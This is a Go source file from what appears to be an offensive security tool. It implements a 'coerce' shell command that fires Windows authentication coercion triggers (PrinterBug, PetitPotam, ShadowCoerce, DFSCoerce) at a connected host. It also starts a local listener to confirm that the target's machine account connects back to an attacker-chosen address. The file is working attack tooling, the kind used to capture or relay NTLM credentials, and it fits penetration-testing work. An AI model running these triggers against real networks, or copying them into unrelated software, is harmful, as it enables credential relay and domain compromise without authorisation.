package shell

// The `coerce` command: machine-account coercion triggers (PrinterBug,
// PetitPotam, ShadowCoerce, DFSCoerce) with a built-in callback listener
// as the success oracle. The trigger functions live in
// internal/smbclient/coerce_*.go; the listener is smbclient.ListenForCallback.

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"anvil/internal/smbclient"
	"anvil/internal/track"
	"anvil/internal/ui"
)

// cmdCoerce fires one coercion trigger at the connected host with a
// callback listener on this machine: coerce <method> <listen-ip> <port>.
// The method forces the target's machine account to authenticate to
// listen-ip:port; the listener answers the question "did it connect
// back?" — the only honest success signal, since the RPC's own reply
// deliberately does not say (patched or hardened targets still accept
// the call and then fail to reach the listener).
func (s *shell) cmdCoerce(args []string) {
	if len(args) < 3 {
		fmt.Printf("  %s\n", ui.Muted.Sprintf("usage: coerce <%s> <listen-ip> <port>", methodList()))
		return
	}
	method := smbclient.CoerceMethod(strings.ToLower(args[0]))
	var fire func(string) error
	switch method {
	case smbclient.CoercePrinterBug:
		fire = s.sess.CoercePrinterBug
	case smbclient.CoercePetitPotam:
		fire = s.sess.CoercePetitPotam
	case smbclient.CoerceShadowCoerce:
		fire = s.sess.CoerceShadowCoerce
	case smbclient.CoerceDFSCoerce:
		fire = s.sess.CoerceDFSCoerce
	default:
		fmt.Printf("  %s\n", ui.Muted.Sprintf("unknown method %q — want: %s", args[0], methodList()))
		return
	}
	port, err := strconv.Atoi(args[2])
	if err != nil || port < 1 || port > 65535 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("port must be 1-65535"))
		return
	}
	listen := strings.TrimLeft(args[1], `\`)

	ui.Faint.Printf("  listening on :%d for the callback (10s)\n", port)
	type cbResult struct {
		peer      string
		connected bool
		err       error
	}
	cbCh := make(chan cbResult, 1)
	go func() {
		peer, connected, err := smbclient.ListenForCallback(port, 10*time.Second)
		cbCh <- cbResult{peer, connected, err}
	}()

	err = fire(listen)
	s.trackOp(track.CategoryExec, "coerce", string(method), listen, err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  %s fired at %s\n", method, s.sess.Host())

	r := <-cbCh
	switch {
	case r.err != nil:
		ui.Warm.Printf("  warning: callback listener failed: %v\n", r.err)
	case r.connected:
		ui.Accent.Printf("  callback: %s connected back — %s works\n", r.peer, method)
	default:
		ui.Warm.Println("  no callback within 10s — the trigger is patched, blocked, or the path is filtered")
	}
}

func methodList() string {
	names := make([]string, len(smbclient.CoerceMethods))
	for i, m := range smbclient.CoerceMethods {
		names[i] = string(m)
	}
	return strings.Join(names, "|")
}
